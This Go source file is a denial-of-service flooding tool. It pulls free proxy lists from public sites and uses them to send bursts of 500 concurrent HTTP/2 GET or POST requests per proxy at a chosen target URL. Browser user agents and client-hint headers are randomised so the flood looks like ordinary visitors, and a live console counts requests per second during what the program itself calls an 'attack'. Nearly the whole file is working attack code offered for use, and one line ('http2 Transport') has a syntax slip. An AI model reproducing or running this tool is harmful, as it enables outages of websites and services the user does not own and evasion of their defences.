package main

import (
    "crypto/tls"
    "flag"
    "fmt"
    "io/ioutil"
    "log"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "golang.org/x/net/http2"
)

var (
    targetURL    string
    duration     int
    threads      int
    proxies      []string
    requestCount uint64
    peakRPS      uint64
    errorCount   uint64

    acceptList = []string{
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/javascript, */*;q=0.8",
        "application/x-www-form-urlencoded;q=0.9,image/webp,image/apng,*/*;q=0.8",
    }

    userAgentList = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.102 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.66 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36",
    }

    paths = []string{"/", "/home", "/login", "/dashboard", "/api/data", "/status"}

    proxySources = []string{
        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
        "https://proxyelite.info/wp-admin/admin-ajax.php?action=proxylister_download&nonce=afb07d3ca5&format=txt",
    }

    clientPool = sync.Pool{
        New: func() interface{} {
            transport := &http2 Transport{
                TLSClientConfig: createTLSConfig(),
                DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
                    return tls.Dial(network, addr, cfg)
                },
            }
            return &http.Client{
                Transport: transport,
                Timeout:   500 * time.Millisecond,
            }
        },
    }
)

func init() {
    flag.StringVar(&targetURL, "url", "", "Target URL")
    flag.IntVar(&duration, "time", 0, "Duration in seconds")
    flag.IntVar(&threads, "threads", 1, "Number of threads")
    flag.Parse()

    if targetURL == "" || duration == 0 {
        fmt.Println("Usage: go run main.go -url [target] -time [seconds] -threads [count]")
        os.Exit(1)
    }
    fetchProxies()
}

// Random functions
func getRandomInt(min, max int) int { return rand.Intn(max-min+1) + min }
func randomMethod() string {
    if rand.Float32() < 0.5 {
        return "GET"
    }
    return "POST"
}
func randomPath() string { return paths[rand.Intn(len(paths))] }

// Create TLS config
func createTLSConfig() *tls.Config {
    return &tls.Config{
        CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
        MinVersion:         tls.VersionTLS13,
        MaxVersion:         tls.VersionTLS13,
        InsecureSkipVerify: true,
        NextProtos:         []string{"h2"},
        CurvePreferences:   []tls.CurveID{tls.X25519},
    }
}

func fetchProxies() {
    client := &http.Client{Timeout: 10 * time.Second}
    var allProxies []string

    for _, source := range proxySources {
        resp, err := client.Get(source)
        if err != nil {
            log.Printf("Warning: Failed to fetch proxies from %s: %v", source, err)
            continue
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Printf("Warning: Failed to read proxy response from %s: %v", source, err)
            continue
        }

        proxies := strings.Split(string(body), "\n")
        for i := range proxies {
            proxy := strings.TrimSpace(proxies[i])
            if proxy != "" {
                allProxies = append(allProxies, proxy)
            }
        }
    }

    if len(allProxies) == 0 {
        log.Fatal("No proxies available")
    }

    proxies = allProxies
    fmt.Printf("Loaded %d proxies\n", len(proxies))
}

func sendRequest(proxyAddr, target string) {
    proxyURL, err := url.Parse("http://" + proxyAddr)
    if err != nil {
        atomic.AddUint64(&errorCount, 1)
        return
    }

    transport := &http2.Transport{
        TLSClientConfig: createTLSConfig(),
        DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
            return tls.Dial(network, addr, cfg)
        },
    }
    transport.Proxy = http.ProxyURL(proxyURL)

    client := &http.Client{
        Transport: transport,
        Timeout:   500 * time.Millisecond,
    }

    var wg sync.WaitGroup
    for i := 0; i < 500; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            headers := map[string]string{
                "sec-purpose":               "prefetch;prerender",
                "purpose":                   "prefetch",
                "sec-ch-ua":                 fmt.Sprintf("\"Not_A Brand\";v=\"%d\", \"Chromium\";v=\"%d\", \"Google Chrome\";v=\"%d\"", getRandomInt(121, 345), getRandomInt(421, 6345), getRandomInt(421, 7124356)),
                "sec-ch-ua-mobile":          "?0",
                "sec-ch-ua-platform":        map[bool]string{true: "Windows", false: "MacOS"}[rand.Float32() < 0.5],
                "upgrade-insecure-requests": "1",
                "accept":                    acceptList[rand.Intn(len(acceptList))],
                "accept-encoding":           "gzip, deflate, br",
                "accept-language":           "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
                "referer":                   target + randomPath(),
                "user-agent":                userAgentList[rand.Intn(len(userAgentList))],
            }

            method := randomMethod()
            path := randomPath()
            req, err := http.NewRequest(method, target+path, nil)
            if err != nil {
                atomic.AddUint64(&errorCount, 1)
                return
            }
            for k, v := range headers {
                req.Header.Set(k, v)
            }
            atomic.AddUint64(&requestCount, 1)
            resp, err := client.Do(req)
            if err != nil {
                atomic.AddUint64(&errorCount, 1)
                return
            }
            resp.Body.Close()
        }()
    }
    wg.Wait()
}

func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
    defer wg.Done()

    for {
        select {
        case <-stopChan:
            return
        default:
            proxy := proxies[rand.Intn(len(proxies))]
            sendRequest(proxy, targetURL)
            time.Sleep(time.Microsecond * 10)
        }
    }
}

func monitorStats(startTime time.Time, stopChan chan struct{}) {
    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()
    var lastCount uint64

    for {
        select {
        case <-stopChan:
            return
        case <-ticker.C:
            current := atomic.LoadUint64(&requestCount)
            errors := atomic.LoadUint64(&errorCount)
            elapsed := time.Since(startTime).Seconds()
            rps := current - lastCount
            if rps > peakRPS {
                atomic.StoreUint64(&peakRPS, rps)
            }
            avgRPS := float64(0)
            if elapsed > 0 {
                avgRPS = float64(current) / elapsed
            }

            fmt.Print("\033[2J\033[1;1H")
            fmt.Printf("Target: %s\n", targetURL)
            fmt.Printf("Time: %.0f/%d seconds\n", elapsed, duration)
            fmt.Printf("Total Requests: %d\n", current)
            fmt.Printf("Current RPS: %d\n", rps)
            fmt.Printf("Peak RPS: %d\n", peakRPS)
            fmt.Printf("Average RPS: %.2f\n", avgRPS)
            fmt.Printf("Errors: %d\n", errors)

            lastCount = current
        }
    }
}

func main() {
    rand.Seed(time.Now().UnixNano())
    startTime := time.Now()
    stopChan := make(chan struct{})
    var wg sync.WaitGroup

    fmt.Printf("Starting attack on %s with %d threads for %d seconds\n", targetURL, threads, duration)
    fmt.Println("Stats will update every second...")

    go monitorStats(startTime, stopChan)

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go attack(&wg, stopChan)
    }

    time.Sleep(time.Duration(duration) * time.Second)
    close(stopChan)
    wg.Wait()

    total := atomic.LoadUint64(&requestCount)
    errors := atomic.LoadUint64(&errorCount)
    elapsed := time.Since(startTime).Seconds()
    avgRPS := float64(0)
    if elapsed > 0 {
        avgRPS = float64(total) / elapsed
    }

    fmt.Print("\033[2J\033[1;1H")
    fmt.Println("Attack completed")
    fmt.Printf("Target: %s\n", targetURL)
    fmt.Printf("Time: %.0f/%d seconds\n", elapsed, duration)
    fmt.Printf("Total Requests: %d\n", total)
    fmt.Printf("Current RPS: 0\n")
    fmt.Printf("Peak RPS: %d\n", peakRPS)
    fmt.Printf("Average RPS: %.2f\n", avgRPS)
    fmt.Printf("Errors: %d\n", errors)
}
